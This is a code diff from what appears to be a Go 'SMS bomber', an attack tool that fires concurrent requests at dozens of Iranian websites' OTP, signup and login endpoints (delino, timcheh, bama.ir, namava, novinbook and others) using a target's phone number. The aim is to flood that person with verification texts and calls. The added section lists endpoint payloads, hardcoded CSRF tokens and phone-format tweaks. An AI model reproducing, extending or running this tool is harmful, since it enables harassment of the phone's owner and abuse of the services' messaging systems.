@@ -25,8 +25,9 @@ gifkart.com
 lintagame.com
 asangem.com
 ---------------------------------------------------------------------------------------------
-kar nakardand :
-	// livarfars.ir (Form)
+❌❌❌❌kar nakardand :
+	        
+                // livarfars.ir (Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
@@ -254,7 +255,199 @@ kar nakardand :
 		// برای این URL، نیاز به بررسی دقیق فرمت بدنه و نوشتن کد سفارشی برای ساخت و ارسال آن دارید.
 		// در حال حاضر به کدهای شما اضافه نشده است زیرا فرمت بدنه نامعمول دارد.
 
+❌❌❌❌kar nakardand 2:               
+                // melix.shop (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
+				"mobile": phone,
+			}, &wg, ch)
+		}
+		// delino.com - PreRegister (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("mobile", phone)
+			sendFormRequest(ctx, "https://www.delino.com/User/PreRegister", formData, &wg, ch)
+		}
+		// delino.com - register (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("mobile", phone)
+			sendFormRequest(ctx, "https://www.delino.com/user/register", formData, &wg, ch)
+		}
+		// api.timcheh.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
+				"mobile": phone,
+			}, &wg, ch)
+		}
+		// beta.raghamapp.com (JSON Array Payload) - Custom
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: این وب‌سرویس یک آرایه JSON شامل یک شیء ارسال می‌کند، نه فقط یک شیء JSON.
+			// کد زیر برای ارسال آرایه تغییر داده شده است و فاقد منطق تلاش مجدد تابع sendJSONRequest است.
+			payload := []map[string]interface{}{
+				{
+					"phone": "+98" + strings.TrimPrefix(phone, "0"), // نمونه شما +98 داشت
+				},
+			}
+			jsonData, err := json.Marshal(payload)
+			if err != nil {
+				fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
+				ch <- http.StatusInternalServerError
+				return
+			}
 
+			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://beta.raghamapp.com/auth", bytes.NewBuffer(jsonData))
+			if err != nil {
+				fmt.Printf("\033[01;31m[-] Error while creating request to %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
+				ch <- http.StatusInternalServerError
+				return
+			}
+			req.Header.Set("Content-Type", "application/json")
+
+			resp, err := http.DefaultClient.Do(req)
+			if err != nil {
+				if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
+					fmt.Printf("\033[01;31m[-] Network error for %s: %v. Retrying is not implemented here, skipping.\033[0m\n", "https://beta.raghamapp.com/auth", err)
+					ch <- http.StatusInternalServerError
+					return
+				} else if ctx.Err() == context.Canceled {
+					fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", "https://beta.raghamapp.com/auth")
+					ch <- 0
+					return
+				} else {
+					fmt.Printf("\033[01;31m[-] Unretryable error for %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
+					ch <- http.StatusInternalServerError
+					return
+				}
+			}
+
+			ch <- resp.StatusCode
+			resp.Body.Close()
+			// بدون منطق Retry
+		}
+		// client.api.paklean.com (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("tel", phone)
+			sendFormRequest(ctx, "https://client.api.paklean.com/download", formData, &wg, ch)
+		}
+		// mashinbank.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://mashinbank.com/api2/users/check", map[string]interface{}{
+				"mobileNumber": phone,
+			}, &wg, ch)
+		}
+		// takfarsh.com (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "vooroodak__submit-username")
+			formData.Set("username", phone)
+			formData.Set("security", "6b19e18a87") // توجه: ممکن است نیاز به تولید داینامیک داشته باشد
+			sendFormRequest(ctx, "https://takfarsh.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+		// dicardo.com (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("csrf_dicardo_name", "0f95d8a7bfbcb67fc92181dc844ab61d") // توجه: ممکن است نیاز به تولید داینامیک داشته باشد
+			formData.Set("phone", phone)
+			formData.Set("type", "0")
+			formData.Set("codmoaref", "")
+			sendFormRequest(ctx, "https://dicardo.com/sendotp", formData, &wg, ch)
+		}
+		// bit24.cash - Register/Send-Code (POST JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: این وب‌سرویس ممکن است نیاز به اجرای یک درخواست GET قبل از این داشته باشد.
+			// این درخواست فقط مرحله POST را انجام می‌دهد و ممکن است بدون مرحله GET کار نکند.
+			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
+				"country_code": "98",
+				"mobile":       phone,
+			}, &wg, ch)
+		}
+		// account.bama.ir (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("username", phone)
+			formData.Set("client_id", "popuplogin")
+			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
+		}
+		// lms.tamland.ir (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
+				"Mobile":       phone,
+				"SchoolId":     -1,
+				"consultantId": "tamland",
+				"campaign":     "campaign",
+				"utmMedium":    "wordpress",
+				"utmSource":    "tamland",
+			}, &wg, ch)
+		}
+		// api.zarinplus.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: در نمونه شما شماره تلفن با "98" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
+			// اگر نیاز به فرمت "98912..." دارید، می‌توانید تبدیل کنید: "98" + strings.TrimPrefix(phone, "0")
+			sendJSONRequest(ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
+				"phone_number": phone,
+				"source":       "zarinplus",
+			}, &wg, ch)
+		}
+		// api.abantether.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+				"phone_number": phone,
+			}, &wg, ch)
+		}
+		// bck.behtarino.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
+				"phone": phone,
+			}, &wg, ch)
+		}
+		// flightio.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: این وب‌سرویس شماره تلفن را با فرمت "98-912..." می‌خواهد.
+			formattedPhone := "98-" + strings.TrimPrefix(phone, "0")
+			sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+				"userKey":     formattedPhone,
+				"userKeyType": 1,
+			}, &wg, ch)
+		}
+		// www.namava.ir (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: این وب‌سرویس شماره تلفن را با فرمت "+98912..." می‌خواهد.
+			formattedPhone := "+98" + strings.TrimPrefix(phone, "0")
+			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
+				"UserName":     formattedPhone,
+				"ReferralCode": nil,
+			}, &wg, ch)
+		}
+		// novinbook.com (Call - Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("route", "account/phone")
+			formData.Set("phone", strings.TrimPrefix(phone, "0"))
+			formData.Set("call", "yes")
+			sendFormRequest(ctx, "https://novinbook.com/index.php?route=account/phone", formData, &wg, ch)
+		}
+
+❌❌❌❌❌kar nakardand 3:
 
 
 ---------------------------------------------------------------------------------------------
